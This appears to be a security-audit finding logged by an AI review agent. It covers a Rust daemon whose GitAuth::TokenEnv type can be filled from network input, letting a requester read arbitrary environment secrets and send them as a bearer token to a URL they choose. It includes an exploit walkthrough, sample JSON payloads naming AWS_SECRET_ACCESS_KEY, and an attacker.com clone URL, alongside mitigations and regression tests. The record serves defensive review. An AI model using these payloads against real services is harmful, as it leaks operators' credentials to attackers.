record_exploration_finding
{
  "path": "crates/nyctos-types/src/repo.rs",
  "line": 39,
  "cap": "TOKEN_ENV_DESERIALIZE_EXFIL",
  "endpoint": "internal: `GitAuth::TokenEnv(String)` (nyctos-types/src/repo.rs:39-49) derives `Deserialize` with no validator on the inner env-var name string. The sink is `nyctos_core::repo::git::ingest_git` at git.rs:86-99: `Some(GitAuth::TokenEnv(var)) => { let val = std::env::var(var).map_err(...)?; match validate_token_scopes(&val).await? { ... } Some(val) }`. The resolved `val` is then handed to `apply_bearer_token_env` (git.rs:245-251) which sets `GIT_CONFIG_VALUE_1=Authorization: Bearer <val>` in the child git process's environment; git then sends that header to `url` — the same field of the same wire-deserialised `RepoSource::Git` — when fetching `git clone --depth 1 --single-branch <url> <dest>` (git.rs:153-163).",
  "rationale": "The TokenEnv variant chains TWO attacker-controlled inputs in the same payload: (a) the env-var NAME the daemon reads (`var`), and (b) the URL the resolved env-var VALUE is bearer-injected into (`url`). Both come from the same wire-deserialised `Repo`. The original threat model assumed both came from the operator-edited TOML; the session-0004 hoist removes that guarantee. The validate_token_scopes defense (git.rs:476-530) probes `https://api.github.com/user` with the token and refuses if a write-scope header is set, but two bypass classes survive:\n\n(1) **GitHub fine-grained-PAT path: NoScopeHeader → AllReadOnly → clone proceeds against attacker URL**. validate_token_scopes branches at git.rs:511-512: `None => Ok(GhScopeCheck::NoScopeHeader)` — fine-grained PATs and GitHub-App tokens deliberately omit `x-oauth-scopes`. The clone then runs against an attacker-controlled `url` (say `https://attacker.com/repo.git`); apply_bearer_token_env (git.rs:245-251) sets `Authorization: Bearer <fine-grained-PAT>`; the attacker's HTTPS server records the bearer. The fine-grained-PAT may carry write-scoped permissions on the operator's private repos — the WRITE_SCOPES list at git.rs:45-67 enumerates CLASSIC-PAT-scope STRINGS (`repo`, `write:packages`, ...); fine-grained-PATs use a different permission model (per-repo `contents:write`, `pull_requests:write`, etc.) that is NOT surfaced via `x-oauth-scopes` at all. The WRITE_SCOPES check is structurally incapable of refusing a write-permitted fine-grained-PAT.\n\n(2) **Probe-side exfil to GitHub-as-witness even when scope refusal fires**: a non-GitHub env-var (e.g. `AWS_SECRET_ACCESS_KEY`, `GCP_SERVICE_ACCOUNT_JSON_B64`, `DATABASE_PASSWORD`) submitted via `TokenEnv(\"AWS_SECRET_ACCESS_KEY\")` causes `std::env::var(...)` to return the AWS key's value; validate_token_scopes_at then sends `GET https://api.github.com/user` with `Authorization: Bearer <AWS_SECRET_ACCESS_KEY_VALUE>`. GitHub returns 401 (fail-closed) — the daemon refuses the clone — BUT the AWS key value has already been transmitted to GitHub. GitHub's request logs now contain operator credentials. This is a third-party-confidentiality breach, not control-of-attacker, but it's still credential leakage with audit-trail implications (the operator has no record that GitHub-the-vendor briefly saw their AWS key).\n\nThe pair of (1)+(2) means: for non-GH tokens the operator's secret leaks to GitHub; for GH-fine-grained-PATs the operator's PAT leaks to the attacker's URL.\n\n(3) **`std::env::var` blanket access**: there is NO allow-list on which env-var names a `TokenEnv` may name. The daemon's full env block is readable: `AWS_SECRET_*`, `GCP_*`, `DATABASE_URL`, `STRIPE_*`, `OPENAI_API_KEY`, `ANTHROPIC_API_KEY` — anything the operator put in the daemon's systemd unit's `Environment=` directive. The original threat model said \"operator names env-vars in the TOML; if the operator names AWS_SECRET_ACCESS_KEY in a TOML token-env auth, that's an operator bug, not a wire-input issue.\" Post-session-0004 the constraint is gone but the env-read remained blanket.\n\n(4) **Same compound applies to LocalPath**: if a future endpoint accepts `Json<Repo>` and the operator's daemon is reading env to build clone URLs (it does — `apply_bearer_token_env` is invoked for every cloneable Repo), an attacker submits Repo with TokenEnv naming an arbitrary env-var and URL pointing at attacker, harvests value. Distinct from #78 (which uses LocalPath as the exfil channel) — TokenEnv uses TLS-encrypted HTTPS bearer header, harder to detect in logs than a /etc/passwd snapshot but more direct.\n\nCompounds with #80 (SshKey arbitrary path) — Repo can carry only ONE auth, but a multi-repo payload can mix TokenEnv on one repo and SshKey on another; combined with #78's LocalPath, three exfil channels per Repo array.\n\nCompounds with sentinel #66 (provenance gap) — the `auth_ref` column persists `descriptor()` (`token-env:AWS_SECRET_ACCESS_KEY`); the audit log records WHICH env-var was named but NOT that the request was wire-deserialised vs TOML-derived. An incident responder reading the audit log post-attack sees `auth_ref=token-env:AWS_SECRET_ACCESS_KEY` and cannot tell whether it came from the operator's TOML (operator bug) or from a wire-injected POST (attacker action) — provenance gap is identical to #66's pattern.\n\nDistinct from existing sentinel findings: no prior finding addresses GitAuth-deserialise-from-wire. #66 (provenance) and #67 (marker collision) are about candidate-pipeline labels, not the auth descriptor. #78 (this batch) is the LocalPath sibling. The static pass cannot fire because the env-read at git.rs:88 is a known, audited operation; the missing piece is the input-validation at the type-deserialise boundary.\n\nMitigations (recommend 1+2+4 minimum):\n\n(1) **Allow-list env-var names at the TokenEnv deserialise site** via `#[serde(deserialize_with = \"validate_token_env_name\")]` that requires the name to match `^[A-Z][A-Z0-9_]*$` AND be present in a runtime-injected `EnvVarAllowList` thread-local. The allow-list is populated from a separate operator-administered file `<state>/token_env.allowlist` (not the same TOML that holds repo configs) so an attacker who lands a `Json<Repo>` route cannot also rewrite the allow-list. Names not on the list deserialise as `Err(\"env-var not allow-listed\")`.\n\n(2) **Refuse non-GitHub URLs for tokenised git auth** at `ingest_git` entry: before `std::env::var(var)`, parse `url` and refuse unless the host matches `github.com` / `*.github.com` / a per-installation list of operator-attested git hosts. The `validate_token_scopes` probe is GitHub-specific; tokens that pass it should only be allowed to flow to GitHub. This addresses bypass class (2) (probe-side exfil) directly — for non-GH urls the env-read never runs.\n\n(3) **Refuse tokenised git auth entirely when the URL is not at the operator-attested hosts** — same as (2) but stricter: combine with the `repos.attested_remote` column referenced in git.rs:112-119's RemoteMismatch check; if `url` differs from the attested remote, refuse before any env-var read.\n\n(4) **Split deserialisable wire shape from in-memory shape**: same architectural fix as #78 mitigation (2). `GitAuthWire { TokenEnv(String), SshKey(String), GhApp(String) }` is the Deserialize-only shape; conversion into `GitAuth` requires explicit policy. The `nyctos-types::GitAuth` then has only `Serialize + TS` — TS frontend can read finger but cannot post.\n\n(5) **Document at nyctos-types/src/repo.rs:39**: \"DANGER: TokenEnv's String is an env-var NAME the daemon will READ; never deserialise this type from a network handler without a host-side allow-list.\" — currently the doc comment says \"Environment variable name that holds a personal access token\" with no security-boundary note.\n\n(6) **Behavioural regression test**: under mitigation (1), `serde_json::from_str::<GitAuth>(r#\"{\"TokenEnv\":\"AWS_SECRET_ACCESS_KEY\"}\"#)` returns Err. Today returns Ok with TokenEnv(\"AWS_SECRET_ACCESS_KEY\") and the value flows.",
  "suggested_payload_hint": "Verifier seed (unit test in nyctos-types/tests/ or nyctos-core/src/repo/git.rs's tests module): `git_auth_token_env_deserialise_admits_arbitrary_env_var_name_today` — `let json = r#\"{\"TokenEnv\":\"AWS_SECRET_ACCESS_KEY\"}\"#; let parsed: nyctos_types::repo::GitAuth = serde_json::from_str(json).expect(\"deserialise\"); assert_eq!(parsed, GitAuth::TokenEnv(\"AWS_SECRET_ACCESS_KEY\".to_string()))`. Today passes. Under mitigation (1) assert `serde_json::from_str::<GitAuth>(json).is_err()`. End-to-end exfil reproducer: `git_token_env_refuses_non_github_url_after_mitigation_2` — wiremock a fake attacker host; construct `Repo { source: RepoSource::Git { url: format!(\"{}/repo.git\", attacker.uri()), auth: Some(GitAuth::TokenEnv(\"FAKE_TOKEN\".to_string())) }, ... }` with `FAKE_TOKEN=test-pat-value` in the test process env; drive `ingest_git`; today observe the attacker wiremock recorded `Authorization: Bearer test-pat-value`; under mitigation (2) assert ingest_git returns `Err(IngestError::AuthUrlHostNotAttested { host })` BEFORE any env-read. GitHub-witness reproducer: drive ingest_git with `url=\"https://github.com/operator/repo.git\"` and `TokenEnv(\"NOT_A_GH_TOKEN\")` where the env-var holds an AWS key shape; today validate_token_scopes_at api.github.com returns 401 → IngestError, but the AWS key has been transmitted (assert via a logging http-proxy that the Authorization header on the api.github.com request contained the AWS key); under mitigation (1)'s allow-list refusal, the env-read never runs, no value reaches GitHub."
}

